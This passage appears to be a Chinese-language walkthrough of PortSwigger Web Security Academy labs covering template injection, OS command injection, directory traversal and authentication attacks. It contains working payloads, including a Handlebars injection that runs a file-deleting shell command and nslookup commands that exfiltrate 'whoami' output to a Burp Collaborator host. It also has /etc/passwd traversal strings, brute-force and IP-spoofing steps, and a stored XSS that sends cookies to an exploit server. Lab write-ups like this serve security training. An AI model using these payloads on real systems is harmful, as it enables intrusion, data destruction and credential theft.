<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>稍加修改，然后再urlencode之后请求一下就成功删除morale.txt</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="line"><span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token string">&quot;s&quot;</span> <span class="token keyword">as</span> <span class="token operator">|</span>string<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">  <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token string">&quot;e&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> split <span class="token keyword">as</span> <span class="token operator">|</span>conslist<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">push</span> <span class="token punctuation">(</span>lookup string<span class="token punctuation">.</span>sub <span class="token string">&quot;constructor&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> string<span class="token punctuation">.</span>split <span class="token keyword">as</span> <span class="token operator">|</span>codelist<span class="token operator">|</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>push <span class="token string">&quot;return require(&#39;child_process&#39;).exec(&#39;rm /home/carlos/morale.txt&#39;);&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>pop<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span>#each conslist<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">          <span class="token punctuation">{</span><span class="token punctuation">{</span>#<span class="token keyword">with</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>sub<span class="token punctuation">.</span>apply <span class="token number">0</span> codelist<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">            <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">          <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span>each<span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">      <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line">  <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">with</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+Es+'" alt="image-20230121224629671"></p><h2 id="server-side-template-injection-with-information-disclosure-via-user-supplied-objects" tabindex="-1"><a class="header-anchor" href="#server-side-template-injection-with-information-disclosure-via-user-supplied-objects"><span>Server-side template injection with information disclosure via user-supplied objects</span></a></h2><p>靶场要求：</p><blockquote><p>由于对象传递到模板中的方式，此实验室容易受到服务器端模板注入的影响。可利用此漏洞访问敏感数据。 要解决实验室问题，请窃取并提交框架的密钥。 您可以使用以下凭据登录到自己的帐户：<code>content-manager:C0nt3ntM4n4g3r</code></p></blockquote><p>实验步骤：</p><p>登录用户，编辑模板，直接给了模板注入的一个测试页面，还支持预览，尝试提交<code>${{&lt;%[%&#39;&quot;}}%\\</code>fuzz测试一下，回显报错显示使用的是<strong>django</strong></p><p><img src="'+Ls+'" alt="image-20230121225512454"></p>',10),qn={href:"https://docs.djangoproject.com/zh-hans/4.1/",target:"_blank",rel:"noopener noreferrer"},En=s("code",null,"{% debug %}",-1),Ln=s("p",null,[s("img",{src:xs,alt:"image-20230121230125056"})],-1),xn={href:"https://docs.djangoproject.com/zh-hans/4.1/ref/settings",target:"_blank",rel:"noopener noreferrer"},Sn=t('<p><img src="'+Ss+'" alt="image-20230121231014081"></p><p>直接用<code>{{settings.SECRET_KEY}}</code>读出secret_key的值，提交密钥即可</p><p><img src="'+Ns+'" alt="image-20230121231332991"></p><h2 id="-2" tabindex="-1"><a class="header-anchor" href="#-2"><span>------------------------------</span></a></h2><h1 id="命令注入" tabindex="-1"><a class="header-anchor" href="#命令注入"><span><strong>命令注入</strong></span></a></h1><p><img src="'+Cs+'" alt="image-20230107220209776"></p><blockquote><p>OS命令注入（也称为shell注入）是一种web安全漏洞，允许攻击者在运行应用程序的服务器上执行任意操作系统（OS）命令，通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用OS命令注入漏洞来危害托管基础设施的其他部分，利用信任关系将攻击转移到组织内的其他系统。</p></blockquote><h2 id="简单案例1" tabindex="-1"><a class="header-anchor" href="#简单案例1"><span>简单案例1</span></a></h2><blockquote><p><strong>目标是获得系统用户名</strong></p></blockquote><blockquote><p><strong>一些有用的命令</strong></p><p>当您已经确定了一个操作系统存在命令注入漏洞，它通常用来执行一些初步命令，以获取有关系统的信息。在Linux和Windows:</p><table><thead><tr><th>目的命令</th><th>Linux</th><th>Windows</th></tr></thead><tbody><tr><td>当前用户名</td><td><code> whoami </code></td><td><code> whoami </code></td></tr><tr><td>操作系统</td><td><code> uname -a </code></td><td><code> ver </code></td></tr><tr><td>网络配置</td><td><code> ifconfig </code></td><td><code> ipconfig /all </code></td></tr><tr><td>网络的连接</td><td><code> netstat -an </code></td><td><code> netstat -an </code></td></tr><tr><td>正在运行的进程</td><td><code> ps -ef </code></td><td><code> tasklist </code></td></tr></tbody></table></blockquote><p>注入点在点击<code>Check stock</code>所发数据包中</p><p><img src="'+Ts+'" alt="image-20230107221854254"></p><p>抓包将<code>storeId=1</code>改为<code>storeId=1|whoami</code>，成功获得当前用户名，解决Lab</p><p><img src="'+Os+'" alt="image-20230107222019669"></p><h2 id="基于时间的命令盲注" tabindex="-1"><a class="header-anchor" href="#基于时间的命令盲注"><span>基于时间的命令盲注</span></a></h2><blockquote><p><strong>目标是产生十秒延时</strong></p></blockquote><p>注入点在点击<code>Submit feedback</code>所发数据包中</p><p><img src="'+p+'" alt="image-20230107223152334"></p><p>抓包将<code>email=b%40g.com</code>改为<code>email=b%40g.com||ping -c 10 127.0.0.1||</code>，成功解决Lab</p><p><img src="'+Rs+'" alt="image-20230107225504039"></p><h2 id="命令注入与输出重定向" tabindex="-1"><a class="header-anchor" href="#命令注入与输出重定向"><span>命令注入与输出重定向</span></a></h2><blockquote><p>重定向输出的注命令一个文件在这个文件夹，然后使用的图片加载URL检索内容的文件。</p></blockquote><p>注入点在点击<code>Submit feedback</code>所发数据包中</p><p><img src="'+p+'" alt="image-20230107223152334"></p><p>抓包将<code>email=b%40g.com</code>改为<code>email=b%40c.com||whoami&gt;/var/www/images/a.txt||</code>，（其中&quot;&gt;&quot;是重定向符）</p><p><img src="'+Is+'" alt="image-20230114201404990"></p><p>然后打开一张图片把<code>filename</code>请求的文件改为<code>a.txt</code>，成功解决Lab</p><p><img src="'+Us+'" alt="image-20230114201517130"></p><p><img src="'+js+'" alt="image-20230114201602470"></p><h2 id="命令注入与oob" tabindex="-1"><a class="header-anchor" href="#命令注入与oob"><span>命令注入与OOB</span></a></h2><blockquote><p><strong>目标是向Burp Collaborator发出DNS lookup</strong></p></blockquote><blockquote><p>nslookup命令用于<strong>查询DNS的记录</strong>，<strong>查看域名解析是否正常</strong>，<strong>在网络故障的时候用来诊断网络问题</strong>。</p></blockquote><p>注入点在点击<code>Submit feedback</code>所发数据包中</p><p><img src="'+p+'" alt="image-20230107223152334"></p><p>抓包将<code>email=dasdasd%40qweqwe.com</code>改为<code>email=dasdasd%40qweqwe.com||nslookup+tolzgp9rlzgmp2ssbxhpkawd64cu0j.burpcollaborator.net||</code>，成功解决Lab</p><p><img src="'+Bs+'" alt="image-20230121170906395"></p><p><img src="'+Ds+'" alt="image-20230121171029688"></p><h2 id="命令注入与带外数据泄露" tabindex="-1"><a class="header-anchor" href="#命令注入与带外数据泄露"><span>命令注入与带外数据泄露</span></a></h2><blockquote><p><strong>目标是执行whoami命令，并通过DNS查询将输出导出到Burp Collaborator</strong></p></blockquote><p>注入点在点击<code>Submit feedback</code>所发数据包中</p><p><img src="'+p+'" alt="image-20230107223152334"></p><p>抓包将<code>email=b%40c.com</code>改为<code>email=b%40c.com||nslookup+</code>`whoami`<code>.z00sswoz16601lbdkba977578yeo2d.burpcollaborator.net||</code>，成功解决Lab</p><p><img src="'+Ps+'" alt="image-20230121171824854"></p><p><img src="'+Ms+'" alt="image-20230121172250187"></p><h2 id="-3" tabindex="-1"><a class="header-anchor" href="#-3"><span>------------------------------</span></a></h2><h1 id="目录遍历" tabindex="-1"><a class="header-anchor" href="#目录遍历"><span><strong>目录遍历</strong></span></a></h1><p>本文涉及Lab过于简单，篇幅较短</p><p><img src="'+As+'" alt="image-20230106203154552"></p><blockquote><p>目录遍历（也称为文件路径遍历）是一种网络安全漏洞，允许攻击者读取运行应用程序的服务器上的任意文件。 这可能包括应用程序代码和数据、后端系统的凭据以及敏感的操作系统文件。在某些情况下，攻击者可能能够写入服务器上的任意文件，从而允许他们修改应用程序数据或行为，并最终完全控制服务器。</p></blockquote><h2 id="简单案例1-1" tabindex="-1"><a class="header-anchor" href="#简单案例1-1"><span>简单案例1</span></a></h2><p>随便打开一张图片</p><p><img src="'+Fs+'" alt="image-20230106210738994"></p><p><img src="'+Ws+'" alt="image-20230106210907926"></p><p>把请求的文件<code>filename</code>改为<code>../../../etc/passwd</code></p><h2 id="简单案例2" tabindex="-1"><a class="header-anchor" href="#简单案例2"><span>简单案例2</span></a></h2><p>把请求的文件<code>filename</code>改为<code>/etc/passwd</code>（绝对路径）</p><h2 id="简单案例3" tabindex="-1"><a class="header-anchor" href="#简单案例3"><span>简单案例3</span></a></h2><p>把请求的文件<code>filename</code>改为<code>....//....//....//etc/passwd</code>(双写绕过)</p><h2 id="简单案例4" tabindex="-1"><a class="header-anchor" href="#简单案例4"><span>简单案例4</span></a></h2><p>把请求的文件<code>filename</code>改为<code>..%252f..252f%..%252f..%252fetc%252fpasswd</code>(双url编码)</p><h2 id="简单案例5" tabindex="-1"><a class="header-anchor" href="#简单案例5"><span>简单案例5</span></a></h2><p>把请求的文件<code>filename</code>改为<code>/var/www/images/../../../etc/passwd</code></p><h2 id="简单案例6" tabindex="-1"><a class="header-anchor" href="#简单案例6"><span>简单案例6</span></a></h2><p>把请求的文件<code>filename</code>改为<code>../../../etc/passwd%00.png</code>（%00截断）</p><h2 id="-4" tabindex="-1"><a class="header-anchor" href="#-4"><span>------------------------------</span></a></h2><h1 id="cors" tabindex="-1"><a class="header-anchor" href="#cors"><span>CORS</span></a></h1><p><img src="'+Qs+'" alt="image-20230114205315477"></p>',67),Nn=s("strong",null,"跨源资源共享",-1),Cn={href:"https://developer.mozilla.org/zh-CN/docs/Glossary/CORS",target:"_blank",rel:"noopener noreferrer"},Tn={href:"https://developer.mozilla.org/zh-CN/docs/Glossary/HTTP",target:"_blank",rel:"noopener noreferrer"},On={href:"https://developer.mozilla.org/zh-CN/docs/Glossary/Origin",target:"_blank",rel:"noopener noreferrer"},Rn=t('<blockquote><p>同源策略是一种限制性的跨域规范，它限制了网站与源域之外的资源进行交互的能力。同源策略是多年前定义的，以应对潜在的恶意跨域交互，例如一个网站从另一个网站窃取私人数据。它通常允许一个域向其他域发出请求，但不允许访问响应。</p></blockquote><h2 id="cors-vulnerability-with-basic-origin-reflection" tabindex="-1"><a class="header-anchor" href="#cors-vulnerability-with-basic-origin-reflection"><span>CORS vulnerability with basic origin reflection</span></a></h2><p>题目要求：</p><blockquote><p>该网站具有不安全的CORS配置，因为它信任所有来源。为了解决这个实验，制作一些 JavaScript，使用 CORS 来检索管理员的 API，密钥并将代码上传到您的漏洞利用服务器。当您成功提交管理员的 API 密钥时，实验室就解决了。您可以使用以下凭据登录自己的帐户： wiener:peter</p></blockquote><p>抓包发现请求<code>/accountdetail</code>的<code>response</code>的<code>Access-Control-Allow-Credentials</code>字段为<code>True</code>，</p><p><img src="'+Hs+'" alt="image-20230116135557860"></p><h2 id="-5" tabindex="-1"><a class="header-anchor" href="#-5"><span>------------------------------</span></a></h2><h1 id="authentication" tabindex="-1"><a class="header-anchor" href="#authentication"><span>Authentication</span></a></h1><p><img src="'+zs+'" alt="image-20230116145328504"></p><blockquote><p>身份验证是验证给定用户或客户端身份的过程。换言之，这涉及到确保他们真的是他们声称的那个人。至少在一定程度上，网站暴露给任何通过设计连接到互联网的人。因此，健壮的身份验证机制是有效web安全的一个重要方面。</p><p>有三种认证因素，可将不同类型的认证分类为：</p><ul><li>您知道的一些信息，例如密码或安全问题的答案。这些有时被称为“知识因素”。</li><li>你拥有的东西，也就是像手机或安全令牌这样的物理对象。这些有时被称为“占有因素”。</li><li>你正在做的事情，例如，你的生物特征或行为模式。这些有时被称为“内在因素”。</li></ul><p>认证机制依赖于一系列技术来验证这些因素中的一个或多个。</p></blockquote><h2 id="username-enumeration-via-different-responses" tabindex="-1"><a class="header-anchor" href="#username-enumeration-via-different-responses"><span>Username enumeration via different responses</span></a></h2><p>靶场要求：</p>',12),In=s("p",null,"这个实验室是脆弱的，以枚举的用户名和密码的暴力攻击。 它有一个帐户，一个可预测的用户名和密码，其中可以找到以下词表:",-1),Un={href:"https://portswigger.net/web-security/authentication/auth-lab-usernames",target:"_blank",rel:"noopener noreferrer"},jn={href:"https://portswigger.net/web-security/authentication/auth-lab-passwords",target:"_blank",rel:"noopener noreferrer"},Bn=s("p",null,"要解决的实验室，一一列举一个有效的用户名、暴力破解这个用户密码，然后访问他们的帐户的网页。",-1),Dn=t('<p>实验步骤：</p><p>进入到登录界面，尝试登录并进行抓包，可以看到显示Invalid username，告诉我们用户名是无效的</p><p><img src="'+Gs+'" alt="image-20230116145952241"></p><p><img src="'+Ys+'" alt="image-20230116150138845"></p><p>于是我们根据Lab提供的用户名和密码使用Intruder进行爆破，设置好字典开始进行爆破</p><p><img src="'+Xs+'" alt="image-20230116150440574"></p><p>然后在爆破结果处按Length排序，可以看到一个response显示的结果不同，显示的是Incorrect password，这告诉我们用户名是auto，但密码错误</p><p><img src="'+Zs+'" alt="image-20230116150619727"></p><p>于是我们以同样的方法爆破密码，在爆破结果中我们可以看到：用户名是auto，密码是monitoring</p><p><img src="'+Vs+'" alt="image-20230116150913593"></p><p>使用爆破得到的用户名和密码，成功登录解决Lab</p><p><img src="'+Js+'" alt="image-20230116151126737"></p><blockquote><p>补充分析：网站对用户名和密码错误采用了不同回显，使得可以逐个字段爆破（如果同回显的话要同时对两个字段进行爆破，payload直接是平方级数量）</p></blockquote><h2 id="_2fa-simple-bypass" tabindex="-1"><a class="header-anchor" href="#_2fa-simple-bypass"><span>2FA simple bypass</span></a></h2><p>靶场要求：</p><blockquote><p>这个实验室的双因素认证可以绕过。您已获得有效的用户名和密码，但无权访问用户的2FA验证码。要解决实验室问题，请访问Carlos的帐户页面。 你的证件：wiener:peter 受害者的证件：carlos:montoya</p></blockquote><p>实验步骤：</p><p>登录进提供的用户名，在邮箱服务器查看二重验证码，填入框中</p><p><img src="'+Ks+'" alt="image-20230116152005706"></p><p>可以注意到填后请求了/my-account这个页面，唯一的认证是cookie而并未携带token等认证，于是我们想到可以直接登录受害者的用户名然后在二重验证处，直接以受害者的cookie请求/my-account即可直接登录成功</p><p><img src="'+$s+'" alt="image-20230116154940007"></p><blockquote><p>补充分析：二重验证码填完后请求的网站只采用cookie进行身份验证</p></blockquote><h2 id="password-reset-broken-logic" tabindex="-1"><a class="header-anchor" href="#password-reset-broken-logic"><span>Password reset broken logic</span></a></h2><p>靶场要求：</p><blockquote><p>该实验室的密码重置功能易受攻击。要解决实验室问题，请重置 Carlos 的密码，然后登录并访问他的“我的帐户”页面。</p><p>您的凭据： wiener:peter 受害者用户名： carlos</p></blockquote><p>实验步骤：</p><p>抓包更改密码重置的数据包为受害者的用户名： <img src="'+sa+'" alt="image-20230116160651129"></p><p><img src="'+aa+'" alt="image-20230116160900152"></p><p>采用受害者的用户名和重置后的密码进行登录，成功登录受害者用户</p><p><img src="'+na+'" alt="image-20230116161022526"></p><blockquote><p>补充分析：虽然采用了token，但并未进行实质性的验证，导致密码重置的数据包被重放</p></blockquote><h2 id="username-enumeration-via-subtly-different-responses" tabindex="-1"><a class="header-anchor" href="#username-enumeration-via-subtly-different-responses"><span>Username enumeration via subtly different responses</span></a></h2><p>靶场要求：</p><blockquote><p>这个实验室很容易受到用户名枚举和密码暴力攻击。它有一个具有可预测用户名和密码的帐户，可以在以下单词列表中找到：</p><ul><li>候选用户名</li><li>候选密码</li></ul><p>要解决实验室问题，请枚举一个有效的用户名，强制使用该用户的密码，然后访问他们的帐户页面。</p></blockquote><p>实验步骤：</p><p>还是抓取登录的数据包，进行用户名爆破，通过Length排序发现数据包长短不一，我们无法进行判断</p><p><img src="'+ea+'" alt="image-20230116162304406"></p><p>此时我们采用Grep进行匹配，设置起始字符串&lt;p class=is-warning&gt;，和末尾字符串&lt;/p&gt;，匹配中间回显的内容</p><p><img src="'+ta+'" alt="image-20230116162714537"></p><p><img src="'+pa+'" alt="image-20230116162932834"></p><p>然后我们以这个匹配规则进行排序，发现第一个的末尾少了个点(.)，于是我们将其锁定为可疑数据包</p><p><img src="'+oa+'" alt="image-20230116162828254"></p><p>然后我们尝试以apple为用户名进行密码爆破，按Length排序锁定第一个可疑数据包</p><p><img src="'+ia+'" alt="image-20230116163912344"></p><p>尝试以用户名apple，密码maggie登录，登录成功</p><p><img src="'+la+'" alt="image-20230116164158236"></p><blockquote><p>补充分析：</p><ol><li>response的长短不一，无法通过简单的Length排序进行判断，而应该使用Grep设置起始字符串和末尾字符串来匹配结果</li><li>本Lab对用户名和密码错误采用了几乎相同的回显，不适用简单的逐个字段爆破</li></ol></blockquote><h2 id="username-enumeration-via-response-timing" tabindex="-1"><a class="header-anchor" href="#username-enumeration-via-response-timing"><span>Username enumeration via response timing</span></a></h2><p>靶场要求：</p>',49),Pn=s("p",null,"这个实验室很容易使用响应时间进行用户名枚举。要解决实验室问题，请枚举一个有效的用户名，强制使用该用户的密码，然后访问他们的帐户页面。",-1),Mn=s("li",null,[s("p",null,"你的证件：wiener:peter")],-1),An={href:"https://portswigger.net/web-security/authentication/auth-lab-usernames",target:"_blank",rel:"noopener noreferrer"},Fn={href:"https://portswigger.net/web-security/authentication/auth-lab-passwords",target:"_blank",rel:"noopener noreferrer"},Wn=s("p",null,"提示： 为了增加挑战，实验室还实施了一种基于IP的暴力保护。然而，这可以通过操纵HTTP请求头轻松绕过。",-1),Qn=t('<p>抓取登录的数据包，使用intruder进行用户名爆破，将密码设置为很长，以增大延时。使用pitchfork，增加XFF头用来伪造IP</p><p><img src="'+ca+'" alt="image-20230116170754861"></p><p>然后打开response received和response completed列，可以看到用户名为affiliates时，相比其他延时较大</p><p><img src="'+ra+'" alt="image-20230116171448917"></p><p>同上文提到的密码爆破方法对密码进行爆破，容易得出用户名为affiliates，密码为thomas</p><p><img src="'+ua+'" alt="image-20230116171724091"></p><p>成功登录受害者用户</p><p><img src="'+da+'" alt="image-20230116171902557"></p><blockquote><p>补充分析：</p><ul><li>Pitchfork类型是将payload随着请求数而遍历，也就是两个字典的输入值是一一对应的</li><li>XFF头指的是HTTP报文最原始的IP地址，通过修改XFF可以达到伪造IP的作用</li></ul></blockquote><h2 id="broken-brute-force-protection-ip-block" tabindex="-1"><a class="header-anchor" href="#broken-brute-force-protection-ip-block"><span>Broken brute-force protection, IP block</span></a></h2><p>靶场要求：</p>',11),Hn=s("p",null,"由于密码暴力保护的逻辑缺陷，该实验室易受攻击。为了解决实验室问题，暴力破解受害者的密码，然后登录并访问他们的帐户页面。",-1),zn=s("li",null,"你的证件：wiener:peter",-1),Gn=s("li",null,"受害者用户名：carlos",-1),Yn={href:"https://portswigger.net/web-security/authentication/auth-lab-passwords",target:"_blank",rel:"noopener noreferrer"},Xn=t('<p>实验步骤：</p><p>抓取登录的数据包，使用pitchfork进行爆破</p><p><img src="'+ga+'" alt="image-20230116174416947"></p><p>由于本Lab对用户登录连续失败次数过多会锁定IP，所以我们要采用我们已知<strong>正确的用户和受害者用户交替登录</strong>的形式，制作字典<img src="'+ma+'" alt="image-20230116174054412"></p><p>设置线程池最大请求数为1，进行密码爆破，并设置过滤掉2xx的response，再按Payload排序，容易看到用户名为carlos，密码为jennifer也登录成功了</p><p><img src="'+ka+'" alt="image-20230116175647089"></p><p><img src="'+ba+'" alt="image-20230116175351092"></p><p><img src="'+ha+'" alt="image-20230116175829634"></p><p>成功登录受害者用户</p><p><img src="'+_a+'" alt="image-20230116175947791"></p><h2 id="username-enumeration-via-account-lock" tabindex="-1"><a class="header-anchor" href="#username-enumeration-via-account-lock"><span>Username enumeration via account lock</span></a></h2><p>靶场要求：</p>',12),Zn=s("p",null,"此实验室易受用户名枚举攻击。它使用帐户锁定，但这包含一个逻辑缺陷。要解决实验室问题，请枚举一个有效的用户名，强制使用该用户的密码，然后访问他们的帐户页面。",-1),Vn={href:"https://portswigger.net/web-security/authentication/auth-lab-usernames",target:"_blank",rel:"noopener noreferrer"},Jn={href:"https://portswigger.net/web-security/authentication/auth-lab-passwords",target:"_blank",rel:"noopener noreferrer"},Kn=t('<p>实验步骤：</p><p>抓取登录数据包，使用Cluster bomb进行爆破，该模式下会将两个payload完全组合</p><p><img src="'+va+'" alt="image-20230119153926662"></p><p>第一个payloads设置为候选用户名，第二个payloads设置为Null，重复次数设为5</p><p><img src="'+fa+'" alt="image-20230119153826185"></p><p><img src="'+ya+'" alt="image-20230119153832991"></p><p>爆破出结果后按Length排序，看到第一条的response里有“You have made too many incorrect login attempts. Please try again in 1 minute(s).“，我们锁定这个用户名aq，随后我们等待一分钟</p><p><img src="'+wa+'" alt="image-20230119154132529"></p><p>按上文提到的爆破密码的方法把密码爆破一遍，得出用户名aq，密码batman，成功登录受害者账户<img src="'+qa+'" alt="image-20230119154934430"></p><p><img src="'+Ea+'" alt="image-20230119154926616"></p><blockquote><p>补充分析：这个靶场如果多次请求账户并且输入密码，会导致出现账户锁定的情况。我们可以推断出只有输入正确的用户名，才会导致账户锁定，所以我们可以检索出正确的用户名进行尝试</p></blockquote><h2 id="_2fa-broken-logic" tabindex="-1"><a class="header-anchor" href="#_2fa-broken-logic"><span>2FA broken logic</span></a></h2><p>靶场要求：</p><blockquote><p>这个实验室的两要素认证是脆弱的，由于其有缺陷的逻辑。 要解决的实验室，访问carlos的帐户的网页。</p><ul><li>你凭据： <code>wiener:peter</code></li><li>受害者的用户名： <code>carlos</code></li></ul><p>你还有的访问的电子邮件服务器收到你的2FA验证码。</p></blockquote><p>实验步骤：</p><p>抓取提交验证码的数据包，将cookie中的verify=wiener改为受害者的verify=carlos</p><p><img src="'+La+`" alt="image-20230121143659203"></p><p>然后对提交的验证码进行爆破（从0000到9999），可以用python生成个验证码爆破字典，也可以设置payload格式为Brute forcer，字符集设为0123456789</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre class="language-python"><code><span class="line"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;out.txt&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;w&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token format-spec">04</span><span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token operator">+</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+xa+'" alt="image-20230121150707727"></p><p>经过一段很长时间的爆破，然后爆破了几遍没爆破出来（</p><p><img src="'+Sa+'" alt="image-20230121160340166"></p><p><img src="'+Na+'" alt="image-20230121145748631"></p><blockquote><p>未完成</p></blockquote><h2 id="brute-forcing-a-stay-logged-in-cookie" tabindex="-1"><a class="header-anchor" href="#brute-forcing-a-stay-logged-in-cookie"><span>Brute-forcing a stay-logged-in cookie</span></a></h2><p>靶场要求：</p>',26),$n=s("p",null,"此实验室允许用户在关闭浏览器会话后仍保持登录状态。用于提供此功能的 cookie 容易受到暴力破解。为了解决实验室问题，暴力破解 Carlos 的 cookie 以访问他的“我的帐户”页面。",-1),se=s("li",null,[a("您的凭据："),s("code",null,"wiener:peter")],-1),ae=s("li",null,[a("受害者用户名："),s("code",null,"carlos")],-1),ne={href:"https://portswigger.net/web-security/authentication/auth-lab-passwords",target:"_blank",rel:"noopener noreferrer"},ee=t('<p>实验步骤：</p><p>抓取登录保持的数据包，分析stay-logged-in字段，根据结构我们猜测该字段经过base64编码，尝试解码</p><p><img src="'+Ca+'" alt="image-20230121161558805"></p><p><img src="'+Ta+'" alt="image-20230121161048427"></p><p>解码后，用户名后面的密码部分也不难看出是用MD5加密</p><p><img src="'+Oa+'" alt="image-20230121161239866"></p><p>至此，我们分析出了stay-logged-in字段的结构为：base64_encode(username:md5(password))，所以我们构造payload进行爆破</p><p><img src="'+Ra+'" alt="image-20230121162611579"></p><p><img src="'+Ia+'" alt="image-20230121162556918"></p><p>爆破成功，这里我们根据response的Set-cookie来登录受害者用户，也可以将发送的请求解码再解密，得出密码为aaaaaa</p><p><img src="'+Ua+'" alt="image-20230121162853063"></p><p><img src="'+ja+'" alt="image-20230121162844545"></p><p>成功登录受害者用户</p><p><img src="'+Ba+'" alt="image-20230121163004976"></p><blockquote><p>补充分析：熟悉常见编码以及加密方式</p></blockquote><h2 id="offline-password-cracking" tabindex="-1"><a class="header-anchor" href="#offline-password-cracking"><span>Offline password cracking</span></a></h2><p>靶场要求：</p><blockquote><p>这个实验室存储用户的密散列在一个饼干。 实验室还包含一个XSS脆弱性评论的功能。 要解决的实验室，获得卡洛斯的 <code>stay-logged-in</code> 饼干并用它来破解了他密码。 然后，登录在 <code>carlos</code> 和删除他的账户从&quot;我的帐户&quot;网页。</p><ul><li>你凭据： <code>wiener:peter</code></li><li>受害者的用户名： <code>carlos</code></li></ul></blockquote><p>实验步骤：</p><p>登录后随便进一篇文章，在留言板插入储存型XSS：<code>&lt;script&gt;documnet.location=&#39;https://exploit-0a2b00e3039cfa87c05e44870157005d.exploit-server.net&#39;+document.cookie&lt;/script&gt;</code></p><p><img src="'+Da+'" alt="image-20230121165608772"></p><h2 id="-6" tabindex="-1"><a class="header-anchor" href="#-6"><span>------------------------------</span></a></h2><h1 id="越权" tabindex="-1"><a class="header-anchor" href="#越权"><span>越权</span></a></h1><p><img src="'+Pa+'" 